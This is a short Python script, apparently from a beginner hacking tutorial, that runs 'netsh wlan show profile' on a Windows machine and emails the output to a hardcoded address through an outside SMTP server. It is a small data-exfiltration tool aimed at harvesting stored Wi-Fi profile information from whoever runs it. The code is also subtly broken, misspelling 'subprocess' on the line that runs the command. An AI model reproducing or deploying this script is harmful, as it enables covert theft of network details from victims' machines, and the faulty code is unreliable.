#!/usr/bin/env python

import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.mail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
result = subrocess.check_output(command, shell=True)
send_mail("youremail@mail.com", "password", result)
